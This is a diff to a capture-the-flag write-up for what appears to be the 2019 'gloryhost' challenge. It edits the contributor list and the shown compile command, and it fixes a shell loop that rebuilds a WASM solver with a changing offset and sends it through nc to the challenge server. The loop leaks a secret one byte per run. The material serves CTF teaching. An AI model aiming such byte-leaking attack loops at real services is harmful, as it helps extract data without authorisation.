@@ -10,7 +10,7 @@ comments: true
 
 Author: mattypiper
 
-Contributors: mattypiper, fringe
+Contributors: mattypiper, fringe, aarbear
 
 ## Description
 
@@ -201,16 +201,15 @@ int main() {}
 Compile with:
 
 ```sh
-/opt/wasi-sdk/bin/clang -DMALOFFSET=1 -Ofast -o solve.wasm \
+/opt/wasi-sdk/bin/clang -DMALOFFSET=1 -o solve.wasm \
     -Wl,-e,this_is_what_ive_got -Wl,--allow-undefined solve.c
 ```
 
 Leak one byte at a time with a script:
 ```sh
 for i in `seq 0 40`; do \
-    nc -N gloryhost.quals2019.oooverflow.io 9999; done | \
-    /opt/wasi-sdk/bin/clang -DMALOFFSET=$i -Ofast -o solve.wasm \
+    /opt/wasi-sdk/bin/clang -DMALOFFSET=$i -o solve.wasm \
     -Wl,-e,this_is_what_ive_got -Wl,--allow-undefined solve.c && \
-    cat solve.wasm | base64 -w0 | nc -N localhost 9999 | egrep '^YOU' | cut -d' ' -f3 | cut -c1-2| xxd -r -p; \
+    cat solve.wasm | base64 -w0 | nc -N gloryhost.quals2019.oooverflow.io 9999 | egrep '^YOU' | cut -d' ' -f3 | cut -c1-2 | xxd -r -p; \
     done
 ```
